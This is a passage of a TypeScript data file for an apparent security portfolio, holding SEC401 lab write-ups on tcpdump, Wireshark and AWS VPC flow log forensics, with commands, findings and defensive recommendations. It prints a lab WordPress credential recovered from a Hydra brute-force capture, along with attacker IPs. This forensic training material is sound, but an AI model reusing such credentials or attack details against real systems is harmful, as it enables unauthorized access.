export interface LabScreenshot {
  src: string;
  alt?: string;
  caption?: string;
}

export interface LabStep {
  title: string;
  description: string;
  command?: string;
  /** Brief explanation of each flag (e.g. "-n: no hostname lookup") */
  commandBreakdown?: string;
  screenshot?: string;
}

export interface CybersecurityLab {
  id: number;
  /** URL segment for course (e.g. "sec401", "aws") */
  courseSlug: string;
  /** URL segment for this lab (e.g. "tcpdump-traffic-analysis") */
  slug: string;
  /** Legacy flat slug for redirects (e.g. "sec401-tcpdump") */
  legacySlug?: string;
  title: string;
  course?: string;
  role?: string;
  /** Focus area (e.g. "Network Forensics") */
  focus?: string;
  /** Level/course code (e.g. "SEC401") */
  level?: string;
  /** Completion date (e.g. "Feb 2026") */
  date?: string;
  /** Artifacts included (e.g. "Sanitized screenshots + my own DNS capture PCAP") */
  artifacts?: string;
  /** 3-line TL;DR for recruiters */
  tldr?: string[];
  /** Skills demonstrated (ATS-friendly) */
  skillsDemonstrated?: string[];
  context: string;
  /** Brief summary for main page card (1-2 sentences) */
  summary: string;
  /** Why this matters in a real attack; show early */
  whyThisMatters: string;
  tools: string[];
  steps: string[];
  stepDetails?: LabStep[];
  outcome: string;
  /** What you'd do next in a real production environment */
  nextStepsInProduction?: string;
  /** Security controls relevant to findings */
  securityControlsRelevant?: string[];
  keyFindings?: string[];
  reportDownloadLink?: string;
  reportDownloadLabel?: string;
  screenshots?: LabScreenshot[];
  /** Original analysis: what this means in practice, what orgs get wrong, your perspective */
  takeaway?: string[];
  comingSoon?: boolean;
}

export const LABS: CybersecurityLab[] = [
  {
    id: 1,
    courseSlug: "sec401",
    slug: "tcpdump-traffic-analysis",
    legacySlug: "sec401-tcpdump",
    title: "tcpdump Traffic Analysis",
    course: "SEC401 - Network Security and Cloud Essentials",
    role: "Solo, Lab",
    context: "This lab demonstrates how to analyze network traffic using tcpdump and extract meaningful patterns from a PCAP file.",
    summary: "Analyzed PCAP traffic with tcpdump: identified /.env probing, WordPress brute-force with Hydra, and cleartext login parameters visible in the HTTP payload.",
    whyThisMatters: "In a real attack, unencrypted HTTP exposes credentials to anyone on the network. This is what defenders see when investigating a breach, and why HTTPS and secure credential handling are non-negotiable in production.",
    focus: "Network Forensics",
    level: "SEC401",
    date: "Feb 2026",
    artifacts: "Sanitized screenshots + my own DNS capture PCAP",
    tldr: [
      ".env probing attempt observed",
      "WordPress login brute force detected",
      "Demonstrates credential exposure risk over plaintext HTTP",
    ],
    skillsDemonstrated: [
      "Packet capture triage",
      "tcpdump filtering",
      "HTTP session analysis",
      "DNS correlation",
      "Attacker pattern recognition",
    ],
    tools: ["tcpdump", "dig", "PCAP analysis", "CLI"],
    steps: [
      "Initial packet overview: tcpdump -n -r investigate.pcap -c 20 -#",
      "Filtered session 1 (135.125.217.54): GET /.env, 404",
      "Read session.pcap: tcpdump -n -r session.pcap -#",
      "HTTP payload extraction: wp-login.php, visible login parameters",
      "Correlate with dig alphainc.ca NS",
      "Live DNS capture and read created_capture.pcap",
      "DNS payload extraction: tcpdump -X on created_capture.pcap",
    ],
    stepDetails: [
      {
        title: "Initial packet overview",
        description: "Read the first 20 packets from investigate.pcap to get a high-level view of traffic types (DNS, TCP, HTTP).",
        command: "tcpdump -n -r investigate.pcap -c 20 -#",
        commandBreakdown: "-n: no DNS/port lookup\n-r: read from file\n-c 20: stop after 20 packets\n-#: print packet number",
        screenshot: "/labs/tcpdump-145021.png",
      },
      {
        title: "Filtering session 1: GET /.env",
        description: "Filtered TCP traffic between 135.125.217.54 and 10.130.8.94 (ports 44366 and 80). Revealed an HTTP GET request for /.env; server responded 404 Not Found.",
        command: "tcpdump -n -r investigate.pcap 'tcp and (host 135.125.217.54 and host 10.130.8.94) and (port 44366 and port 80)'",
        commandBreakdown: "Filter: tcp + host/port pair",
        screenshot: "/labs/tcpdump-150012.png",
      },
      {
        title: "Read session.pcap",
        description: "Read session.pcap to view the filtered wp-login session packets.",
        command: "tcpdump -n -r session.pcap -#",
        screenshot: "/labs/tcpdump-150547.png",
      },
      {
        title: "HTTP payload extraction: visible login parameters",
        description: "Dumped packet contents. Revealed cleartext HTTP POST to /wp-login.php with Hydra user-agent and visible login parameters (redacted).",
        command: "tcpdump -n -r session.pcap -X -v -c 4",
        commandBreakdown: "-X: hex and ASCII payload; -v: verbose; -c 4: stop after 4 packets",
        screenshot: "/labs/tcpdump-150815.png",
      },
      {
        title: "Correlate with dig",
        description: "Used dig to query NS records for alphainc.ca, correlating with the captured DNS traffic.",
        command: "dig alphainc.ca NS",
        commandBreakdown: "alphainc.ca: domain; NS: name server",
        screenshot: "/labs/tcpdump-151413.png",
      },
      {
        title: "Live DNS capture and read",
        description: "Captured live UDP traffic on port 53 (DNS) with sudo tcpdump, wrote to created_capture.pcap, then read the capture to view DNS queries and responses.",
        command: "sudo tcpdump -n -i eth0 -w created_capture.pcap 'udp port 53'\ntcpdump -n -r created_capture.pcap",
        commandBreakdown: "-i: interface; -w: write to file; Filter: udp port 53",
        screenshot: "/labs/tcpdump-151524.png",
      },
      {
        title: "DNS payload extraction",
        description: "Dumped DNS packet contents in hex and ASCII, revealing domain names in the payload.",
        command: "tcpdump -n -r created_capture.pcap -X",
        screenshot: "/labs/tcpdump-151610.png",
      },
    ],
    outcome:
      "This lab reinforced how quickly attacker behavior stands out in raw packet captures once you know what to filter for. It also highlighted how dangerous plaintext HTTP is in real environments, since authentication data can be recovered directly from packet payloads.",
    nextStepsInProduction:
      "If this were production: I'd confirm whether the source was internal or external, check web server logs for repeated attempts, enforce HTTPS, and apply rate limiting or WAF protections around authentication endpoints.",
    securityControlsRelevant: [
      "Enforce HTTPS (HSTS)",
      "Rate-limit wp-login",
      "WAF rules for /.env probing",
      "Centralized logging + alerting (SIEM)",
    ],
    keyFindings: [
      "HTTP GET /.env from 135.125.217.54 to 10.130.8.94; server returned 404",
      "HTTP POST /wp-login.php with Hydra user-agent",
      "DNS NS lookup mapped alphainc.ca to AWS nameservers",
    ],
    takeaway: [
      "The /.env probe is one of the most common automated scans on the internet, but most teams only monitor for it at the WAF layer. The real question isn't whether you block it, it's whether you alert on it. A 404 response means the file wasn't there, but the attacker now knows the server is live, running a web framework, and worth further probing. That single failed request often precedes the brute-force attempt that follows minutes later.",
      "What stood out in this lab was how readable cleartext HTTP traffic is. The WordPress credentials were sitting in the packet payload, fully visible, with no decryption required. This is obvious in theory, but seeing it in a real PCAP changes how you think about HTTPS enforcement. It's not just a compliance checkbox. Any network segment without TLS is functionally broadcasting credentials to anyone with tcpdump access.",
      "If I were building detection rules from this capture, I'd focus on two signals: any outbound DNS query to a domain immediately followed by HTTP POST to a login endpoint from a different source IP, and any user-agent string containing known tool signatures like Hydra. These are low-noise, high-confidence indicators that most SIEMs can correlate in real time.",
    ],
    screenshots: [
      { src: "/labs/tcpdump-145021.png", alt: "Step 1: Initial packet overview", caption: "tcpdump -n -r investigate.pcap -c 20 -#" },
      { src: "/labs/tcpdump-150012.png", alt: "Step 2: Filtered session 1", caption: "GET /.env, 404 (135.125.217.54)" },
      { src: "/labs/tcpdump-150547.png", alt: "Step 3: Read session.pcap", caption: "tcpdump -n -r session.pcap -#" },
      { src: "/labs/tcpdump-150815.png", alt: "Step 4: HTTP payload extraction", caption: "tcpdump -n -r session.pcap -X -v -c 4 (wp-login.php, visible login parameters)" },
      { src: "/labs/tcpdump-151413.png", alt: "Step 5: Correlate with dig", caption: "dig alphainc.ca NS" },
      { src: "/labs/tcpdump-151524.png", alt: "Step 6: Live DNS capture and read", caption: "sudo tcpdump -n -i eth0 -w created_capture.pcap 'udp port 53'; tcpdump -n -r created_capture.pcap" },
      { src: "/labs/tcpdump-151610.png", alt: "Step 7: DNS payload extraction", caption: "tcpdump -n -r created_capture.pcap -X" },
    ],
  },
  {
    id: 2,
    courseSlug: "sec401",
    slug: "wireshark-packet-analysis",
    legacySlug: "wireshark",
    title: "Wireshark Packet Analysis",
    course: "SEC401 - Network Security and Cloud Essentials",
    role: "Solo, Lab",
    context:
      "This lab demonstrates how to use Wireshark's GUI-based packet analysis to investigate a 628K-packet PCAP, identify attack patterns through protocol hierarchy and conversation statistics, and reconstruct attacker sessions using display filters and stream following.",
    summary:
      "Investigated a 628K-packet PCAP in Wireshark: used protocol hierarchy and conversation statistics to surface a port-80 scanning pattern from 3.142.238.241, followed an HTTP stream revealing a successful WordPress brute-force login (Hydra, admin/#AlphaInc!), and completed a live-capture exercise extracting an HTTP object from loopback traffic.",
    whyThisMatters:
      "Wireshark turns raw packets into actionable intelligence. In incident response, the ability to quickly triage hundreds of thousands of packets using statistics, filters, and stream reconstruction is what separates a useful analyst from someone drowning in data. This lab builds exactly that muscle.",
    focus: "Network Forensics",
    level: "SEC401",
    date: "Mar 2026",
    artifacts: "Sanitized screenshots from Wireshark GUI analysis",
    tldr: [
      "Triaged 628K packets using protocol hierarchy and conversation statistics",
      "Reconstructed a successful WordPress brute-force login via HTTP stream following",
      "Completed live capture + HTTP object export on loopback traffic",
    ],
    skillsDemonstrated: [
      "Wireshark protocol hierarchy analysis",
      "Conversation and endpoint statistics",
      "Display filter construction",
      "TCP stream reconstruction",
      "HTTP object export",
      "Live packet capture",
      "Attacker pattern recognition",
    ],
    tools: ["Wireshark", "PCAP analysis", "Display filters", "HTTP stream following"],
    steps: [
      "Opened investigate.pcap (628,631 packets) and inspected initial TCP handshake + GET /.env",
      "Protocol Hierarchy Statistics: TCP 88.2%, HTTP 22.6%, TLS 44.3%, DNS 1.1%",
      "Conversations (TCP): identified 3.142.238.241 scanning port 80 across many ephemeral ports",
      "Endpoints (TCP): confirmed 1.1.1.1, 3.5.129.171, and mass 3.142.238.241 connections",
      "Built display filter: ip.addr == 20.106.124.93",
      "Followed HTTP stream (tcp.stream eq 13299): POST /wp-login.php with Hydra user-agent, 302 Found",
      "Inspected decoded form data: log=admin, pwd=#AlphaInc!, redirect to /wp-admin/",
      "Lab environment setup: ./lab-1.2 start, launched Wireshark with sudo",
      "Browsed localhost:8080/welcome.html, captured loopback HTTP traffic",
      "Applied http filter on live capture, inspected GET /workbook/ requests",
      "Exported HTTP object (file.txt): 'You completed the lab! Congratulations!'",
    ],
    stepDetails: [
      {
        title: "Initial PCAP inspection",
        description:
          "Opened investigate.pcap in Wireshark (628,631 packets). The first packets show a TCP three-way handshake between 135.125.217.54 and 10.130.8.94, followed by an HTTP GET /.env returning 404 Not Found. Same reconnaissance probe identified in the tcpdump analysis.",
        screenshot: "/labs/wireshark-093147.png",
      },
      {
        title: "Protocol Hierarchy Statistics",
        description:
          "Statistics → Protocol Hierarchy revealed the traffic composition: TCP dominated at 88.2% (554K packets), with HTTP at 22.6% and TLS at 44.3%. UDP accounted for 11.8%, with DNS at 1.1%. SMB2 (3.1%) and SSH (1.1%) also present. This gives an instant overview of what protocols to investigate.",
        screenshot: "/labs/wireshark-094707.png",
      },
      {
        title: "Conversation statistics: scanning pattern",
        description:
          "Statistics → Conversations → TCP tab exposed a clear pattern: 3.142.238.241 made hundreds of short-lived connections to 10.130.8.94 on port 80, each with exactly 10 packets and ~1,375 bytes. This uniform, high-volume pattern is consistent with automated scanning or brute-force activity.",
        screenshot: "/labs/wireshark-094854.png",
      },
      {
        title: "Endpoint statistics",
        description:
          "Statistics → Endpoints → TCP tab confirmed the top talkers: 1.1.1.1 (ports 80 and 443), 3.5.129.171 (port 443), and the mass of 3.142.238.241 ephemeral-port connections. This helps prioritize which hosts to investigate further.",
        screenshot: "/labs/wireshark-095035.png",
      },
      {
        title: "Display filter construction",
        description:
          "Used Analyze → Display Filter Expression to build a filter for ip.addr == 20.106.124.93. The GUI filter builder shows available fields, operators, and validates the expression before applying. Helpful for constructing complex filters without memorizing syntax.",
        command: "ip.addr == 20.106.124.93",
        commandBreakdown: "ip.addr: match source or destination IP\n==: exact match operator",
        screenshot: "/labs/wireshark-095448.png",
      },
      {
        title: "HTTP stream: WordPress brute-force success",
        description:
          "Right-clicked → Follow → HTTP Stream on tcp.stream eq 13299. Revealed a POST to /wp-login.php from a Hydra user-agent with credentials in cleartext. The server responded 302 Found with WordPress authentication cookies and a redirect to /wp-admin/, confirming a successful brute-force login.",
        command: "tcp.stream eq 13299",
        commandBreakdown: "tcp.stream: isolate a single TCP conversation\neq 13299: stream index from Wireshark's reassembly",
        screenshot: "/labs/wireshark-095941.png",
      },
      {
        title: "Decoded form data inspection",
        description:
          "Wireshark's protocol dissection decoded the URL-encoded form body: log=admin, pwd=#AlphaInc!, wp-submit=Log In, redirect_to=http://www.alphainc.ca/wp-admin/. Extracting structured fields from raw bytes is where Wireshark's GUI shines over command-line tools.",
        screenshot: "/labs/wireshark-100217.png",
      },
      {
        title: "Lab environment setup",
        description:
          "Set up the lab environment: navigated to /sec401/labs/1.2, ran ./lab-1.2 start to launch the local web server, then opened Wireshark with sudo for live capture privileges.",
        command: "cd /sec401/labs/1.2 && ./lab-1.2 start && sudo wireshark 2>/dev/null &",
        commandBreakdown: "./lab-1.2 start: launch local web server\nsudo wireshark: root privileges for capture\n2>/dev/null &: suppress warnings, run in background",
        screenshot: "/labs/wireshark-100626.png",
      },
      {
        title: "Live capture: browsing the lab web app",
        description:
          "Browsed to localhost:8080/welcome.html which displayed 'Welcome to SEC401!' with a 'Download Your File' link. This generated HTTP traffic on the loopback interface for live capture analysis.",
        screenshot: "/labs/wireshark-101042.png",
      },
      {
        title: "Live capture analysis with http filter",
        description:
          "Applied the 'http' display filter on the live loopback capture. Wireshark showed GET /workbook/ and subsequent requests for CSS, JS, and image assets. Full page load dissected packet by packet. 250 packets captured, 42 displayed after filtering.",
        command: "http",
        commandBreakdown: "http: display filter showing only HTTP protocol packets\nFilters out TCP handshakes, TLS, DNS, etc.",
        screenshot: "/labs/wireshark-101109.png",
      },
      {
        title: "HTTP object export: lab completion",
        description:
          "Used File → Export Objects → HTTP to extract file.txt from the captured traffic. The file contained 'You completed the lab! Congratulations!' with ASCII art. This shows Wireshark can reconstruct and export files transferred over HTTP.",
        screenshot: "/labs/wireshark-101824.png",
      },
    ],
    outcome:
      "This lab built on the tcpdump foundation by showing how Wireshark's GUI accelerates investigation at scale. Protocol hierarchy gave an instant traffic breakdown. Conversation statistics surfaced the scanning pattern in seconds, something that would require careful scripting with tcpdump. Stream following reconstructed the full attacker session, confirming a successful WordPress brute-force with decoded credentials. The live capture exercise demonstrated end-to-end workflow: capture, filter, and extract artifacts.",
    nextStepsInProduction:
      "If this were production: I'd correlate the 3.142.238.241 scanning pattern with firewall logs and threat intel feeds, check whether the brute-forced admin account was used for lateral movement, export IOCs (IPs, user-agents, target URLs) to the SIEM, and verify that wp-login.php is protected by rate limiting, MFA, and HTTPS.",
    securityControlsRelevant: [
      "Enforce HTTPS (HSTS) to prevent credential interception",
      "MFA on WordPress admin accounts",
      "Rate-limit and geo-block wp-login.php",
      "WAF rules for automated tool user-agents (Hydra)",
      "Network segmentation to limit lateral movement",
      "Centralized logging + SIEM alerting on brute-force patterns",
    ],
    keyFindings: [
      "628,631 packets: TCP 88.2%, HTTP 22.6%, TLS 44.3%, DNS 1.1%",
      "3.142.238.241 → 10.130.8.94:80, hundreds of uniform 10-packet connections (port scanning/brute-force)",
      "Successful WordPress login: POST /wp-login.php with Hydra user-agent, admin/#AlphaInc!, 302 → /wp-admin/",
      "Live capture: HTTP object export recovered file.txt from loopback traffic",
    ],
    takeaway: [
      "The conversation statistics view in Wireshark identified the brute-force pattern in under 5 seconds. Hundreds of uniform 10-packet sessions from the same IP to port 80 is unmistakable. But here's the problem: most organizations would only catch this after the fact, in a SIEM query. The gap between 'visible in packet capture' and 'detected in production' is where most breaches live. If your IDS isn't alerting on connection volume anomalies per source IP, you're relying on an analyst opening Wireshark after someone already noticed something wrong.",
      "Following the HTTP stream that contained the successful login was the most valuable exercise. The 302 redirect to /wp-admin/ with authentication cookies confirmed the attacker was inside. In a real incident, this is the moment the investigation shifts from 'were we targeted?' to 'what did they access?' Most IR playbooks don't emphasize this transition enough. Once you confirm a successful auth, every minute you spend continuing to analyze the brute-force traffic is time the attacker is moving laterally.",
      "The protocol hierarchy breakdown (HTTP 22.6%, TLS 44.3%) tells an important story: more than half the HTTP traffic was unencrypted. In 2024+, any production environment with that ratio has a fundamental configuration problem. But I've seen this in real environments. Legacy internal apps, misconfigured load balancers, and health check endpoints that 'don't need HTTPS' create exactly this kind of exposure.",
    ],
    screenshots: [
      { src: "/labs/wireshark-093147.png", alt: "Step 1: Initial PCAP inspection", caption: "TCP handshake + GET /.env → 404 (same probe seen in the tcpdump lab)" },
      { src: "/labs/wireshark-094707.png", alt: "Step 2: Protocol Hierarchy Statistics", caption: "TCP 88.2%, HTTP 22.6%, TLS 44.3%, DNS 1.1% across 628K packets" },
      { src: "/labs/wireshark-094854.png", alt: "Step 3: Conversation statistics", caption: "3.142.238.241 scanning port 80, hundreds of uniform 10-packet sessions" },
      { src: "/labs/wireshark-095035.png", alt: "Step 4: Endpoint statistics", caption: "Top talkers: 1.1.1.1, 3.5.129.171, mass 3.142.238.241 connections" },
      { src: "/labs/wireshark-095448.png", alt: "Step 5: Display filter construction", caption: "ip.addr == 20.106.124.93 via GUI filter builder" },
      { src: "/labs/wireshark-095941.png", alt: "Step 6: HTTP stream, WordPress brute-force", caption: "POST /wp-login.php, Hydra user-agent, 302 Found → /wp-admin/" },
      { src: "/labs/wireshark-100217.png", alt: "Step 7: Decoded form data", caption: "log=admin, pwd=#AlphaInc!, wp-submit=Log In" },
      { src: "/labs/wireshark-100626.png", alt: "Step 8: Lab environment setup", caption: "./lab-1.2 start, sudo wireshark" },
      { src: "/labs/wireshark-101042.png", alt: "Step 9: Lab web app", caption: "localhost:8080/welcome.html, Welcome to SEC401!" },
      { src: "/labs/wireshark-101109.png", alt: "Step 10: Live capture with http filter", caption: "GET /workbook/ and asset requests on loopback" },
      { src: "/labs/wireshark-101824.png", alt: "Step 11: HTTP object export", caption: "Exported file.txt, lab completion confirmed" },
    ],
  },
  {
    id: 3,
    courseSlug: "sec401",
    slug: "vpc-flow-logs",
    legacySlug: "aws-vpc-flow-logs",
    title: "AWS VPC Flow Log Analysis",
    course: "SEC401 - Network Security and Cloud Essentials",
    role: "Solo, Lab",
    context:
      "This lab demonstrates how to analyze AWS VPC Flow Logs to investigate attacker activity at scale. Starting with 579 gzip-compressed log files containing 173,198 flow records, the goal was to extract, filter, and quantify traffic from a known attacker IP (20.106.124.93), determine the attack timeframe, calculate data transfer volumes per service, and convert PCAP data into NetFlow format for comparison analysis.",
    summary:
      "Analyzed 173K VPC flow records across 579 log files: isolated 33,232 attacker flows from 20.106.124.93, determined a 6.5-hour attack window, quantified 265MB exfiltrated on port 8889 and 190MB on port 80, and confirmed the full attack surface (HTTP, SSH, 8889) using PCAP-to-NetFlow conversion with nfpcapd/nfdump.",
    whyThisMatters:
      "VPC Flow Logs are often the first data source available during a cloud incident. Knowing how to rapidly extract attacker flows from hundreds of compressed log files, calculate data exfiltration volumes, and correlate with PCAP-derived NetFlow is exactly what a SOC analyst or incident responder does when investigating a breach in AWS.",
    focus: "Cloud Network Forensics",
    level: "SEC401",
    date: "Apr 2026",
    artifacts: "Sanitized screenshots from VPC flow log analysis and NetFlow conversion",
    tldr: [
      "Extracted 33,232 attacker flows from 173K records across 579 compressed VPC log files",
      "Identified 6.5-hour attack window with 265MB exfiltrated on port 8889 and 190MB on port 80",
      "Confirmed full attack surface (ports 80, 22, 8889) via PCAP-to-NetFlow conversion with nfpcapd/nfdump",
    ],
    skillsDemonstrated: [
      "AWS VPC Flow Log analysis",
      "Bulk log file processing (zcat, zgrep)",
      "Attacker flow extraction and filtering",
      "Data exfiltration quantification",
      "Timestamp correlation (epoch conversion)",
      "PCAP-to-NetFlow conversion (nfpcapd/nfdump)",
      "Network flow analysis",
      "Attack surface enumeration",
    ],
    tools: ["AWS VPC Flow Logs", "zcat", "zgrep", "awk", "sort", "nfpcapd", "nfdump", "CLI"],
    steps: [
      "Listed 579 gzip VPC flow log files and identified format with file command",
      "Decompressed and inspected flow log header and sample records with zcat | head -4",
      "Counted total flow records across all logs: 173,198",
      "Extracted attacker flows (20.106.124.93) with zgrep into attacker-flows.log: 33,232 records",
      "Determined attack timeframe via epoch sort: Sep 28 2023 5:22 PM - 11:59 PM UTC (~6.5 hours)",
      "Calculated bytes transferred per port: 8889 = 265MB, port 80 = 190MB",
      "Converted PCAP to NetFlow with nfpcapd, analyzed with nfdump",
      "Filtered NetFlow for attacker IP: confirmed ports 80 (HTTP), 22 (SSH), 8889 (exfil)",
      "Excluded all three ports from attacker flows: no additional traffic, confirming full attack surface",
    ],
    stepDetails: [
      {
        title: "List and identify VPC flow log files",
        description:
          "Listed all files in the log directory: 579 gzip-compressed VPC flow log files. Used the file command to confirm they were gzip compressed data from a FAT filesystem, original size ~32KB each.",
        command: "ls /sec401/labs/1.3/20230928/ | wc -l\nfile /sec401/labs/1.3/20230928/2226771286B0_vpcflowlogs_us-east-2_fl-0272f42338e6eeaaf_20230928T23552_e92fb168.log.gz",
        commandBreakdown: "wc -l: count files\nfile: identify file type and compression",
        screenshot: "/labs/vpc-flow-logs-115605.png",
      },
      {
        title: "Inspect flow log format and sample records",
        description:
          "Decompressed a log file with zcat and piped to head -4 to see the header and first records. The VPC flow log format includes: version, region, account-id, instance-id, interface-id, type, srcaddr, dstaddr, srcport, dstport, protocol, bytes, packets, tcp-flags, start, end, action, log-status, flow-direction, traffic-path. First records showed 35.203.211.65 being REJECT'd and 10.130.8.94 ACCEPT'd traffic.",
        command: "zcat file /sec401/labs/1.3/20230928/2226771286B0_vpcflowlogs_us-east-2_fl-0272f42338e6eeaaf_20230928T23552_e92fb168.log.gz | head -4",
        commandBreakdown: "zcat: decompress and output to stdout\nhead -4: show header + 3 sample records",
        screenshot: "/labs/vpc-flow-logs-115724.png",
      },
      {
        title: "Count total flow records",
        description:
          "Decompressed all 579 log files and counted total lines: 173,198 flow records to investigate.",
        command: "zcat /sec401/labs/1.3/20230928/*log.gz | wc -l",
        commandBreakdown: "*log.gz: glob all compressed logs\nwc -l: count total lines",
        screenshot: "/labs/vpc-flow-logs-115859.png",
      },
      {
        title: "Extract attacker flows",
        description:
          "Used zgrep to search all compressed log files for the known attacker IP (20.106.124.93) and redirected matches to attacker-flows.log. Result: 33,232 flow records from the attacker.",
        command: "zgrep --no-filename 20.106.124.93 /sec401/labs/1.3/20230928/*log.gz > /sec401/labs/1.3/attacker-flows.log\nwc -l /sec401/labs/1.3/attacker-flows.log",
        commandBreakdown: "zgrep: grep compressed files\n--no-filename: omit file names from output\n> redirect to attacker-flows.log",
        screenshot: "/labs/vpc-flow-logs-120203.png",
      },
      {
        title: "Determine attack timeframe",
        description:
          "Sorted attacker flows by the start-time epoch field (column 15) to find the earliest and latest timestamps. Converted epochs with date -d: the attack ran from Sep 28, 2023 5:22 PM to 11:59 PM UTC, roughly 6.5 hours.",
        command: "sort -nk 15 /sec401/labs/1.3/attacker-flows.log | head -1\ndate -d @1695921755\nsort -nk 15 /sec401/labs/1.3/attacker-flows.log | tail -1\ndate -d @1695945545",
        commandBreakdown: "sort -nk 15: numeric sort on column 15 (start epoch)\ndate -d @epoch: convert epoch to human-readable",
        screenshot: "/labs/vpc-flow-logs-120457.png",
      },
      {
        title: "Quantify data transfer by port",
        description:
          "Used awk to filter attacker flows by destination port and sum the bytes field (column 12). Port 8889 transferred 265,183,813 bytes (~265MB) and port 80 transferred 190,703,527 bytes (~190MB). The high volume on port 8889 is a strong indicator of data exfiltration over a non-standard port.",
        command: "cat attacker-flows.log | awk '$10 == \"8889\"' | awk '{SUM=SUM+$12} END{print \"Total bytes transferred: \"SUM}'\ncat attacker-flows.log | awk '$9 == \"80\"' | awk '{SUM=SUM+$12} END{print \"Total bytes transferred: \"SUM}'",
        commandBreakdown: "$10 == \"8889\": filter by dst port 8889\n$9 == \"80\": filter by dst port 80\n$12: bytes field\nSUM+$12: running total",
        screenshot: "/labs/vpc-flow-logs-120852.png",
      },
      {
        title: "Convert PCAP to NetFlow with nfpcapd",
        description:
          "Used nfpcapd to convert the investigate.pcap from the Wireshark lab into NetFlow format, outputting to exported-netflow/ directory. This enables flow-level analysis of the same traffic using NetFlow tools.",
        command: "nfpcapd -r /sec401/labs/1.2/investigate.pcap -w exported-netflow/",
        commandBreakdown: "-r: read PCAP file\n-w: write NetFlow output directory",
        screenshot: "/labs/vpc-flow-logs-121229.png",
      },
      {
        title: "Analyze NetFlow with nfdump",
        description:
          "Dumped the converted NetFlow data to a text file and opened it. The output shows Date first seen, Duration, Proto, Src/Dst IP:Port, Packets, Bytes, and Flows columns. This structured format makes it easy to filter and correlate with VPC flow log findings.",
        command: "nfdump -R exported-netflow/ > pcap-derived-netflow.txt",
        commandBreakdown: "-R: read recursively from directory",
        screenshot: "/labs/vpc-flow-logs-121431.png",
      },
      {
        title: "Filter NetFlow for attacker on port 80",
        description:
          "Filtered the PCAP-derived NetFlow for the attacker IP on port 80. Confirmed HTTP traffic: 20.106.124.93:51278 to 10.130.8.94:80, matching the WordPress brute-force activity found in Labs 1.1 and 1.2.",
        command: "head -1 pcap-derived-netflow.txt; cat pcap-derived-netflow.txt | grep 20.106.124.93 | head -2",
        screenshot: "/labs/vpc-flow-logs-121640.png",
      },
      {
        title: "Filter for attacker SSH traffic",
        description:
          "Excluded port 80 and filtered for remaining attacker flows. Found SSH connections on port 22 from 20.106.124.93:38504 to 10.130.8.94:22, indicating the attacker also accessed the server via SSH.",
        command: "head -1 pcap-derived-netflow.txt; cat pcap-derived-netflow.txt | grep 20.106.124.93 | grep -v :80 | head -2",
        screenshot: "/labs/vpc-flow-logs-121731.png",
      },
      {
        title: "Identify non-standard port activity",
        description:
          "Excluded ports 80 and 22, revealing traffic on port 8889: 20.106.124.93:8889 to 10.130.8.94:36072. Port 8889 is not a well-known service (confirmed via /etc/services), making this a likely data exfiltration channel consistent with the 265MB volume found in VPC flow logs.",
        command: "head -1 pcap-derived-netflow.txt; cat pcap-derived-netflow.txt | grep 20.106.124.93 | grep -v :80 | grep -v :22 | head -2",
        commandBreakdown: "grep -v: exclude matches\nSequential exclusion isolates unknown services",
        screenshot: "/labs/vpc-flow-logs-121856.png",
      },
      {
        title: "Confirm complete attack surface",
        description:
          "Excluded all three known ports (80, 22, 8889) from attacker flows. Empty result confirmed the attacker used only these three services: HTTP for the initial brute-force, SSH for interactive access, and port 8889 for data exfiltration.",
        command: "head -1 pcap-derived-netflow.txt; cat pcap-derived-netflow.txt | grep 20.106.124.93 | grep -v :80 | grep -v :22 | grep -v :8889 | head -2",
        screenshot: "/labs/vpc-flow-logs-121944.png",
      },
    ],
    outcome:
      "This lab demonstrated how to investigate attacker activity at scale using VPC Flow Logs. Starting from 579 compressed log files with 173K records, I isolated the attacker, mapped their 6.5-hour attack window, quantified data exfiltration volumes, and confirmed the complete attack surface across three services. The PCAP-to-NetFlow conversion bridged packet-level evidence from previous labs with flow-level cloud telemetry, showing how both data sources tell the same story from different angles.",
    nextStepsInProduction:
      "If this were production: I'd feed the attacker IP into threat intel platforms for enrichment, check if port 8889 traffic triggered any IDS/IPS alerts, audit what data was accessible from the compromised instance, verify whether the SSH session was used for lateral movement to other instances, and configure VPC Flow Log alerts for anomalous outbound traffic volumes and non-standard ports.",
    securityControlsRelevant: [
      "Enable VPC Flow Logs on all subnets and ENIs",
      "Alert on high-volume outbound traffic to non-standard ports",
      "Network ACLs restricting egress to approved ports only",
      "Security group rules limiting SSH access to known IPs",
      "GuardDuty for automated anomaly detection on flow data",
      "Centralized log aggregation (CloudWatch, S3, SIEM)",
    ],
    keyFindings: [
      "579 compressed VPC flow log files, 173,198 total flow records",
      "33,232 flows from attacker IP 20.106.124.93 (~19% of all traffic)",
      "Attack window: Sep 28, 2023 5:22 PM to 11:59 PM UTC (~6.5 hours)",
      "Port 8889: 265MB transferred (data exfiltration via non-standard port)",
      "Port 80: 190MB transferred (HTTP brute-force and web access)",
      "Port 22: SSH access confirmed via NetFlow correlation",
      "No additional attacker ports found, confirming complete attack surface enumeration",
    ],
    takeaway: [
      "265MB on port 8889 is the finding that matters most in this lab, and it's the one that would be hardest to catch in production. Most security groups configure egress rules for known ports: block outbound SSH, restrict HTTP to approved destinations. But port 8889 isn't in any default deny list because it's not a well-known service. The attacker chose it precisely because it falls into the gap between 'explicitly blocked' and 'actively monitored.' The fix isn't blocking port 8889 specifically. It's flipping the egress model: deny all outbound traffic by default, and only allow what's explicitly needed.",
      "The 6.5-hour attack window raises a practical question: how long until someone notices? In this scenario, the attacker had nearly 7 hours of uninterrupted access. That's enough to exfiltrate an entire database, establish persistence, and pivot to other instances. Most organizations measure their mean-time-to-detect (MTTD) in days, not hours. GuardDuty would have flagged the unusual outbound volume, but only if it was enabled. VPC Flow Logs were there the entire time, recording everything, but nobody was watching in real time.",
      "Converting the PCAP to NetFlow with nfpcapd proved something important: packet-level and flow-level data tell the same story from different angles. In a real investigation, you often have one or the other, not both. Knowing how to work with both formats and correlate between them is the difference between confirming an attack and missing half the picture. The attacker used HTTP to get in, SSH for interactive access, and port 8889 to pull data out. Flow logs showed the volume, PCAP showed the content. Together, they give you the complete kill chain.",
    ],
    screenshots: [
      { src: "/labs/vpc-flow-logs-115605.png", alt: "Step 1: List VPC flow log files", caption: "579 gzip-compressed VPC flow log files identified" },
      { src: "/labs/vpc-flow-logs-115724.png", alt: "Step 2: Inspect flow log format", caption: "zcat | head -4: VPC flow log header and sample REJECT/ACCEPT records" },
      { src: "/labs/vpc-flow-logs-115859.png", alt: "Step 3: Count total flow records", caption: "173,198 flow records across all 579 log files" },
      { src: "/labs/vpc-flow-logs-120203.png", alt: "Step 4: Extract attacker flows", caption: "zgrep 20.106.124.93: 33,232 attacker flow records" },
